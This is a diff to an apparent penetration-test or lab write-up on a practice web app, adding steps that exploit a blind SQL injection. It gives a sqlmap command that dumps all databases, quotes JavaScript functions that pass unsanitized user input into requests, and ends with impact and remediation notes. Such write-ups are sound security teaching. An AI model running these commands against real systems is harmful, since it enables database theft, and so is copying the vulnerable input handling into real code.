@@ -203,9 +203,39 @@ Test
 ------WebKitFormBoundaryq47yQI2jPO4y7p7J--
 ```
 5) Above request will amke the web app to sleep for 5 sec 
+
 ![Alt Text](https://i.ibb.co/FKQRWP7/sqlblind.png)
 
-2) Send the 
+6) Modify the python command to now dump the db.
+```python
+python3 sqlmap.py -r test.txt --level=3 --risk=3 --batch --dbms=mysql --threads=10 --dump-all
+```
+7) You shloud see db getting dumped
+
+![Alt Text](https://i.ibb.co/Qpw8sDq/dump-db.png)
+
+8) Later it was found that what function leads to this
+```
+function check_user(user) {
+
+
+plainajax.request('respurl: check_user.php?user=' +  user + '; resultloc: response; ');
+
+}
+
+function add_user(user,name,surname) {
+plainajax.request('respurl: add_user.php?user=' +  user + '&name=' + name + '&surname=' + surname +'; resultloc: response; ');
+
+}
+```
+9) Availabe at **http://foophones.securitybrigade.com:8080/scripts/functions.js**, code is passing whatever gets into the paramters.
+
+###### Impact: 
+Attacker can easily dump the whole server's db.
+
+###### Recommendation:
+Have a waf or sanitize user input before sending it to db
+ 
 
 ### High Impact
 
